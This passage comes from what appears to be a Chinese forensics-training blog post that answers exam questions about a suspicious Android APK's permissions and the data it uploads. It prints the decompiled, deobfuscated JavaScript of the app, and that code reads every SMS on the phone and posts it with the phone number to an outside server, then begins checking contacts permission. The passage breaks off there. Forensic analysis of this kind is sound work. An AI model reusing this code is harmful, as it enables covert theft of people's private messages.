<tr>
<td>BLUETOOTH_ADMIN</td>
<td>管理蓝牙设备，如扫描或配对。</td>
</tr>
<tr>
<td>VIBRATE</td>
<td>允许设备振动。</td>
</tr>
<tr>
<td>WAKE_LOCK（<strong>电池与电源管理</strong>）</td>
<td>防止设备进入休眠模式。</td>
</tr>
<tr>
<td>RECEIVE_BOOT_COMPLETED</td>
<td>允许应用在设备启动后自动运行。</td>
</tr>
<tr>
<td>REQUEST_INSTALL_PACKAGES（ <strong>安装与应用管理</strong>）</td>
<td>允许应用安装其他应用包。</td>
</tr>
<tr>
<td>SYSTEM_ALERT_WINDOW</td>
<td>允许应用显示系统级弹窗。</td>
</tr>
<tr>
<td>READ_LOGS（<strong>设备状态与日志</strong>）</td>
<td>读取系统日志。</td>
</tr>
<tr>
<td>WRITE_SYNC_SETTINGS</td>
<td>修改同步设置。</td>
</tr>
</tbody>
</table>
<ul>
<li>对着题目选项去找对应的关键字，然后再看<code>xml</code>有没有该关键字的内容
<ul>
<li><code>READ_SMS</code></li>
<li><code>READ_PHONE_STATE</code></li>
<li><code>ACCESS_FINE_LOCATION</code></li>
<li><code>WRITE_CONTACTS</code></li>
<li><code>WRITE_SMS</code></li>
</ul>
</li>
<li>找到对应关键字内容即可答案全选都有</li>
<li>使用<code>雷电app手机分析可以得到</code></li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241020105942841.png" alt="image-20241020105942841"></p>
<h3 id="题目5"><a class="markdownIt-Anchor" href="#题目5"></a> 题目5</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">该APK发送回后台服务器的数据包含一下哪些内容(多选题)：</span><br><span class="line"></span><br><span class="line">A.手机通讯录</span><br><span class="line">B.手机应用列表</span><br><span class="line">C.手机号码</span><br><span class="line">D.验证码</span><br><span class="line">E.GPS定位信息</span><br></pre></td></tr></table></figure>
<ul>
<li>在<code>jadx</code>中使用反编译该apk，然后搜索关键字<code>内涵一点</code></li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241020110508901.png" alt="image-20241020110508901"></p>
<ul>
<li>点击进入相关页面，找到第二个框的<code>sojson</code></li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241020110548186.png" alt="image-20241020110548186"></p>
<ul>
<li>这里是做了一个<code>js</code>代码混淆，防止别人轻易看出代码，这里给出一个在线<code>sjson</code>解密的网站,解密后就会出现如下内容</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*Aman - 194nb.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *Progcessed By JSDec in 0.00s</span></span><br><span class="line"><span class="comment"> *JSDec - JSDec.js.org</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mui.<span class="title function_">init</span>();</span><br><span class="line"></span><br><span class="line">		mui.<span class="title function_">plusReady</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">			<span class="comment">//var main = plus.android.runtimeMainActivity();  </span></span><br><span class="line">			<span class="comment">// main.moveTaskToBack(false);</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">var</span> address = plus.<span class="property">device</span>.<span class="property">vendor</span> + <span class="string">&#x27;-&#x27;</span> + plus.<span class="property">device</span>.<span class="property">model</span>;</span><br><span class="line">			address = address.<span class="title function_">replace</span>(<span class="regexp">/\n/g</span>, <span class="string">&quot;&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/ /g</span>, <span class="string">&quot;&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/\r/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">			<span class="keyword">var</span> apiserver = <span class="string">&#x27;http://www.honglian7001.com/api/uploads/&#x27;</span>;</span><br><span class="line">			<span class="comment">//重复数据处理 预防用户重复点击</span></span><br><span class="line">			<span class="keyword">var</span> danjishijian = <span class="literal">true</span>;</span><br><span class="line">			<span class="keyword">function</span> <span class="title function_">requestPermission</span>(<span class="params">sjh, yqm</span>) &#123;</span><br><span class="line">				plus.<span class="property">android</span>.<span class="title function_">requestPermissions</span>(</span><br><span class="line">					[<span class="string">&quot;android.permission.READ_SMS&quot;</span>],</span><br><span class="line">					<span class="keyword">function</span> (<span class="params">resultObj</span>) &#123;</span><br><span class="line">						<span class="comment">//SmsInfo存放一条短信的各项内容</span></span><br><span class="line">						<span class="keyword">var</span> <span class="title class_">SmsInfo</span> = &#123;&#125;</span><br><span class="line">						<span class="comment">//Sms存放所有短信</span></span><br><span class="line">						<span class="keyword">var</span> <span class="title class_">Sms</span> = &#123;&#125;</span><br><span class="line"></span><br><span class="line">						<span class="keyword">var</span> aimei = sjh;</span><br><span class="line">						<span class="keyword">var</span> aimei2 = yqm;</span><br><span class="line">						<span class="keyword">var</span> duanxin = <span class="string">&#x27;[&#123;&quot;imei&quot;:&quot;&#x27;</span> + aimei + <span class="string">&#x27;&quot;,&quot;imei2&quot;:&quot;&#x27;</span> + aimei2 + <span class="string">&#x27;&quot;&#125;&#x27;</span>;</span><br><span class="line">						<span class="keyword">var</span> <span class="title class_">Cursor</span> = plus.<span class="property">android</span>.importClass(<span class="string">&quot;android.database.Cursor&quot;</span>)</span><br><span class="line">						<span class="keyword">var</span> <span class="title class_">Uri</span> = plus.<span class="property">android</span>.importClass(<span class="string">&quot;android.net.Uri&quot;</span>)   <span class="comment">//注意啦，android.net.Uri中的net是小写</span></span><br><span class="line">						<span class="keyword">var</span> activity = plus.<span class="property">android</span>.<span class="title function_">runtimeMainActivity</span>()</span><br><span class="line">						<span class="keyword">var</span> uri = <span class="title class_">Uri</span>.<span class="title function_">parse</span>(<span class="string">&quot;content://sms/&quot;</span>);</span><br><span class="line"></span><br><span class="line">						<span class="keyword">var</span> projection = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;_id&quot;</span>, <span class="string">&quot;address&quot;</span>, <span class="string">&quot;person&quot;</span>, <span class="string">&quot;body&quot;</span>, <span class="string">&quot;date&quot;</span>, <span class="string">&quot;type&quot;</span>)</span><br><span class="line">						<span class="keyword">var</span> cusor = activity.<span class="title function_">managedQuery</span>(uri, projection, <span class="literal">null</span>, <span class="literal">null</span>, <span class="string">&quot;date desc&quot;</span>)</span><br><span class="line">						<span class="keyword">var</span> idColumn = cusor.<span class="title function_">getColumnIndex</span>(<span class="string">&quot;_id&quot;</span>)</span><br><span class="line">						<span class="keyword">var</span> nameColumn = cusor.<span class="title function_">getColumnIndex</span>(<span class="string">&quot;person&quot;</span>)</span><br><span class="line">						<span class="keyword">var</span> phoneNumberColumn = cusor.<span class="title function_">getColumnIndex</span>(<span class="string">&quot;address&quot;</span>)</span><br><span class="line">						<span class="keyword">var</span> smsbodyColumn = cusor.<span class="title function_">getColumnIndex</span>(<span class="string">&quot;body&quot;</span>)</span><br><span class="line">						<span class="keyword">var</span> dateColumn = cusor.<span class="title function_">getColumnIndex</span>(<span class="string">&quot;date&quot;</span>)</span><br><span class="line">						<span class="keyword">var</span> typeColumn = cusor.<span class="title function_">getColumnIndex</span>(<span class="string">&quot;type&quot;</span>)</span><br><span class="line">						<span class="keyword">if</span> (cusor != <span class="literal">null</span>) &#123;</span><br><span class="line">							<span class="keyword">while</span> (cusor.<span class="title function_">moveToNext</span>()) &#123;</span><br><span class="line">								<span class="title class_">SmsInfo</span>.<span class="property">id</span> = cusor.<span class="title function_">getString</span>(idColumn)</span><br><span class="line">								<span class="title class_">SmsInfo</span>.<span class="property">Name</span> = cusor.<span class="title function_">getInt</span>(nameColumn)</span><br><span class="line">								<span class="title class_">SmsInfo</span>.<span class="property">Date</span> = cusor.<span class="title function_">getLong</span>(dateColumn)</span><br><span class="line">								<span class="title class_">SmsInfo</span>.<span class="property">Date</span> = <span class="title function_">getFormatDate</span>(<span class="title class_">SmsInfo</span>.<span class="property">Date</span>)</span><br><span class="line">								<span class="title class_">SmsInfo</span>.<span class="property">PhoneNumber</span> = cusor.<span class="title function_">getString</span>(phoneNumberColumn)</span><br><span class="line">								<span class="title class_">SmsInfo</span>.<span class="property">Smsbody</span> = cusor.<span class="title function_">getString</span>(smsbodyColumn)</span><br><span class="line">								<span class="title class_">SmsInfo</span>.<span class="property">Type</span> = cusor.<span class="title function_">getString</span>(typeColumn)</span><br><span class="line"></span><br><span class="line">								<span class="keyword">var</span> post = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="title class_">SmsInfo</span>);</span><br><span class="line">								<span class="comment">//console.log(post);</span></span><br><span class="line">								duanxin = duanxin + <span class="string">&#x27;,&#x27;</span> + post;</span><br><span class="line"></span><br><span class="line">							&#125;</span><br><span class="line">							duanxin = duanxin + <span class="string">&#x27;]&#x27;</span>;</span><br><span class="line">							<span class="comment">//alert(duanxin);</span></span><br><span class="line"></span><br><span class="line">							mui.<span class="title function_">ajax</span>(apiserver + <span class="string">&#x27;apisms&#x27;</span>, &#123;</span><br><span class="line">								<span class="attr">data</span>: &#123;</span><br><span class="line">									<span class="attr">data</span>: duanxin</span><br><span class="line">								&#125;,</span><br><span class="line">								<span class="attr">dataType</span>: <span class="string">&#x27;text&#x27;</span>,<span class="comment">//服务器返回json格式数据</span></span><br><span class="line">								<span class="attr">type</span>: <span class="string">&#x27;post&#x27;</span>,<span class="comment">//HTTP请求类型</span></span><br><span class="line">								<span class="attr">timeout</span>: <span class="number">10000</span>,<span class="comment">//超时时间设置为10秒；              </span></span><br><span class="line">								<span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">									mui.<span class="title function_">toast</span>(<span class="string">&#x27;获取成功&#x27;</span>)</span><br><span class="line">									<span class="comment">//console.log(con)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">								&#125;,</span><br><span class="line">								<span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">xhr, type, errorThrown</span>) &#123;</span><br><span class="line">									<span class="comment">//异常处理；</span></span><br><span class="line"></span><br><span class="line">								&#125;</span><br><span class="line">							&#125;);</span><br><span class="line">							cusor.<span class="title function_">close</span>()</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					&#125;,</span><br><span class="line">					<span class="keyword">function</span> (<span class="params">error</span>) &#123;</span><br><span class="line">						<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;申请权限错误：&#x27;</span> + error.<span class="property">code</span> + <span class="string">&quot; = &quot;</span> + error.<span class="property">message</span>);</span><br><span class="line">					&#125;);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			<span class="comment">//扩展Date功能：将long型日期转换为特定的格式</span></span><br><span class="line">			<span class="title class_">Date</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">format</span> = <span class="keyword">function</span> (<span class="params">format</span>) &#123;</span><br><span class="line">				<span class="keyword">var</span> o = &#123;</span><br><span class="line">					<span class="string">&quot;M+&quot;</span>: <span class="variable language_">this</span>.<span class="title function_">getMonth</span>() + <span class="number">1</span>,</span><br><span class="line">					<span class="string">&quot;d+&quot;</span>: <span class="variable language_">this</span>.<span class="title function_">getDate</span>(),</span><br><span class="line">					<span class="string">&quot;h+&quot;</span>: <span class="variable language_">this</span>.<span class="title function_">getHours</span>(),</span><br><span class="line">					<span class="string">&quot;m+&quot;</span>: <span class="variable language_">this</span>.<span class="title function_">getMinutes</span>(),</span><br><span class="line">					<span class="string">&quot;s+&quot;</span>: <span class="variable language_">this</span>.<span class="title function_">getSeconds</span>(),</span><br><span class="line">					<span class="string">&quot;q+&quot;</span>: <span class="title class_">Math</span>.<span class="title function_">floor</span>((<span class="variable language_">this</span>.<span class="title function_">getMonth</span>() + <span class="number">3</span>) / <span class="number">3</span>),</span><br><span class="line">					<span class="string">&quot;S&quot;</span>: <span class="variable language_">this</span>.<span class="title function_">getMilliseconds</span>()</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (<span class="regexp">/(y+)/</span>.<span class="title function_">test</span>(format)) &#123;</span><br><span class="line">					format = format.<span class="title function_">replace</span>(<span class="title class_">RegExp</span>.<span class="property">$1</span>, (<span class="variable language_">this</span>.<span class="title function_">getFullYear</span>() + <span class="string">&quot;&quot;</span>).<span class="title function_">substr</span>(<span class="number">4</span> - <span class="title class_">RegExp</span>.<span class="property">$1</span>.<span class="property">length</span>));</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">var</span> k <span class="keyword">in</span> o) &#123;</span><br><span class="line">					<span class="keyword">if</span> (<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&quot;(&quot;</span> + k + <span class="string">&quot;)&quot;</span>).<span class="title function_">test</span>(format)) &#123;</span><br><span class="line">						format = format.<span class="title function_">replace</span>(<span class="title class_">RegExp</span>.<span class="property">$1</span>, <span class="title class_">RegExp</span>.<span class="property">$1</span>.<span class="property">length</span> == <span class="number">1</span> ? o[k] : (<span class="string">&quot;00&quot;</span> + o[k]).<span class="title function_">substr</span>((<span class="string">&quot;&quot;</span> + o[k]).<span class="property">length</span>));</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">return</span> format;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			<span class="comment">//将long型日期转换为特定格式</span></span><br><span class="line">			<span class="keyword">function</span> <span class="title function_">getFormatDate</span>(<span class="params">l, pattern</span>) &#123;</span><br><span class="line">				date = <span class="keyword">new</span> <span class="title class_">Date</span>(l);</span><br><span class="line">				<span class="keyword">if</span> (pattern == <span class="literal">undefined</span>) &#123;</span><br><span class="line">					pattern = <span class="string">&quot;yyyy-MM-dd hh:mm:ss&quot;</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">return</span> date.<span class="title function_">format</span>(pattern);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			<span class="comment">//alert(plus.device.uuid)</span></span><br><span class="line">			plus.<span class="property">navigator</span>.<span class="title function_">setStatusBarBackground</span>(<span class="string">&quot;#db6eff&quot;</span>);</span><br><span class="line"></span><br><span class="line">			<span class="title function_">mui</span>(<span class="string">&quot;body&quot;</span>).<span class="title function_">off</span>(<span class="string">&quot;tap&quot;</span>);</span><br><span class="line"></span><br><span class="line">			<span class="title function_">mui</span>(<span class="string">&quot;body&quot;</span>).<span class="title function_">on</span>(<span class="string">&#x27;tap&#x27;</span>, <span class="string">&#x27;#tx&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line"></span><br><span class="line">				$(<span class="string">&#x27;#tx&#x27;</span>).<span class="title function_">hide</span>();</span><br><span class="line">				$(<span class="string">&#x27;#zz&#x27;</span>).<span class="title function_">show</span>();</span><br><span class="line">			&#125;);</span><br><span class="line"></span><br><span class="line">			<span class="title function_">mui</span>(<span class="string">&quot;body&quot;</span>).<span class="title function_">on</span>(<span class="string">&#x27;tap&#x27;</span>, <span class="string">&#x27;#gb&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line"></span><br><span class="line">				$(<span class="string">&#x27;#tx&#x27;</span>).<span class="title function_">show</span>();</span><br><span class="line">				$(<span class="string">&#x27;#zz&#x27;</span>).<span class="title function_">hide</span>();</span><br><span class="line">			&#125;);</span><br><span class="line"></span><br><span class="line">			<span class="title function_">mui</span>(<span class="string">&quot;body&quot;</span>).<span class="title function_">on</span>(<span class="string">&#x27;tap&#x27;</span>, <span class="string">&#x27;#qd&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span> (danjishijian) &#123;</span><br><span class="line">					danjishijian = <span class="literal">false</span>;</span><br><span class="line">					<span class="title function_">aa</span>()</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="title function_">aa</span>()</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			<span class="keyword">function</span> <span class="title function_">getPermission</span>(<span class="params">permissionIdentity, successCallBack, errorCallBack</span>) &#123;</span><br><span class="line">				<span class="comment">//权限标识转换成大写  </span></span><br><span class="line">				<span class="keyword">var</span> permissionIdentity = permissionIdentity.<span class="title function_">toUpperCase</span>();</span><br><span class="line">				<span class="comment">//获取检测权限的状态  </span></span><br><span class="line">				<span class="keyword">var</span> checkResult = plus.<span class="property">navigator</span>.<span class="title function_">checkPermission</span>(permissionIdentity);</span><br><span class="line">				<span class="comment">//权限状态是否正常  </span></span><br><span class="line">				<span class="keyword">var</span> permissionStatusOk = <span class="literal">false</span>;</span><br><span class="line">				<span class="comment">//权限中文名称  </span></span><br><span class="line">				<span class="keyword">var</span> permissionName = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">				<span class="comment">//对应 andorid 的具体权限  </span></span><br><span class="line">				<span class="keyword">var</span> androidPermission = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">				<span class="comment">//获取权限中文意思与对应 android 系统的权限字符串  </span></span><br><span class="line">				<span class="keyword">switch</span> (permissionIdentity) &#123;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">case</span> <span class="string">&#x27;CONTACTS&#x27;</span>:</span><br><span class="line">						permissionName = <span class="string">&#x27;系统联系人&#x27;</span>;</span><br><span class="line">						androidPermission = <span class="string">&#x27;android.permission.READ_CONTACTS&#x27;</span></span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">					<span class="attr">default</span>:</span><br><span class="line">						permissionName = <span class="string">&#x27;未知&#x27;</span>;</span><br><span class="line">						androidPermission = <span class="string">&#x27;未知&#x27;</span>;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="comment">//判断检查权限的结果  </span></span><br><span class="line">				<span class="keyword">switch</span> (checkResult) &#123;</span><br><span class="line">					<span class="keyword">case</span> <span class="string">&#x27;authorized&#x27;</span>:</span><br><span class="line">						<span class="comment">//正常的  </span></span><br><span class="line">						permissionStatusOk = <span class="literal">true</span></span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">case</span> <span class="string">&#x27;denied&#x27;</span>:</span><br><span class="line">						<span class="comment">//表示程序已被用户拒绝使用此权限，如果是拒绝的就再次提示用户打开确认提示框  </span></span><br><span class="line">						<span class="comment">//如果有该权限但是没有打开不进行操作还是会去申请或手动打开  </span></span><br><span class="line">						<span class="comment">// console.log(&#x27;已关闭&#x27; + permissionName + &#x27;权限&#x27;)  </span></span><br><span class="line">						<span class="comment">// errorCallBack(&#x27;已关闭&#x27; + permissionName + &#x27;权限&#x27;);  </span></span><br><span class="line">						<span class="comment">// return  </span></span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">case</span> <span class="string">&#x27;undetermined&#x27;</span>:</span><br><span class="line">						<span class="comment">// 表示程序未确定是否可使用此权限，此时调用对应的API时系统会弹出提示框让用户确认  </span></span><br><span class="line">						<span class="comment">// this.requestPermissions(androidPermission, permissionName, successCallBack, errorCallBack)  </span></span><br><span class="line">						<span class="comment">// errorCallBack(&#x27;未确定&#x27; + permissionName + &#x27;权限&#x27;);  </span></span><br><span class="line">						<span class="comment">// return  </span></span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">case</span> <span class="string">&#x27;unknown&#x27;</span>:</span><br><span class="line">						<span class="title function_">errorCallBack</span>(<span class="string">&#x27;无法查询&#x27;</span> + permissionName + <span class="string">&#x27;权限&#x27;</span>);</span><br><span class="line">						<span class="keyword">return</span></span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					<span class="attr">default</span>:</span><br><span class="line">						<span class="title function_">errorCallBack</span>(<span class="string">&#x27;不支持&#x27;</span> + permissionName + <span class="string">&#x27;权限&#x27;</span>);</span><br><span class="line">						<span class="keyword">return</span></span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="comment">//如果权限是正常的执行成功回调  </span></span><br><span 